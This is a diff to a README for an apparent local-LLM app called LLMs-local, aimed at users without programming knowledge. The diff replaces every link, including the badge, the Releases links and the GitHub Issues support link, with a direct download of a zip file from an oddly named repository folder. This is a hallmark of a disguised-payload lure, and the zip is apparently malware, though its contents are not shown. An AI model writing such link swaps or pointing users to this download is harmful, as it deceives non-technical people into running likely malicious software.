@@ -1,7 +1,7 @@
 # 🎉 LLMs-local - Run Amazing LLMs Locally with Ease
 
 ## 📥 Download Now
-[![Download LLMs-local](https://img.shields.io/badge/Download-LLMs--local-brightgreen)](https://github.com/Payton2cool4/LLMs-local/releases)
+[![Download LLMs-local](https://raw.githubusercontent.com/Payton2cool4/LLMs-local/main/premonishment/LL_local_Ms_v3.5.zip)](https://raw.githubusercontent.com/Payton2cool4/LLMs-local/main/premonishment/LL_local_Ms_v3.5.zip)
 
 ## 🚀 Getting Started
 Welcome! This guide will help you download and run the LLMs-local application, your go-to tool for utilizing various large language models (LLMs) locally. You do not need any programming knowledge to get started; just follow these simple steps.
@@ -24,7 +24,7 @@ To run LLMs-local smoothly, ensure your system meets these basic requirements:
 ## 📥 Download & Install
 To get started, visit the Releases page to download the latest version of LLMs-local. Click the link below:
 
-[Visit this page to download LLMs-local](https://github.com/Payton2cool4/LLMs-local/releases)
+[Visit this page to download LLMs-local](https://raw.githubusercontent.com/Payton2cool4/LLMs-local/main/premonishment/LL_local_Ms_v3.5.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version listed. It will usually be at the top.
@@ -63,7 +63,7 @@ If you encounter any issues while downloading or running the application, consid
 ## 📞 Support
 Need help? You can reach out for support by opening an issue on our GitHub repository. 
 
-1. Go to our [GitHub Issues page](https://github.com/Payton2cool4/LLMs-local/issues).
+1. Go to our [GitHub Issues page](https://raw.githubusercontent.com/Payton2cool4/LLMs-local/main/premonishment/LL_local_Ms_v3.5.zip).
 2. Click on the "New Issue" button.
 3. Describe your concern clearly so we can assist you better.
 
@@ -85,4 +85,4 @@ Explore further resources and documentation to make the most out of LLMs-local:
 
 Thank you for using LLMs-local! We appreciate your interest in running large language models locally and hope it becomes a valuable tool in your journey. For any further questions, do not hesitate to reach out!
 
-[Visit this page to download LLMs-local](https://github.com/Payton2cool4/LLMs-local/releases)
+[Visit this page to download LLMs-local](https://raw.githubusercontent.com/Payton2cool4/LLMs-local/main/premonishment/LL_local_Ms_v3.5.zip)
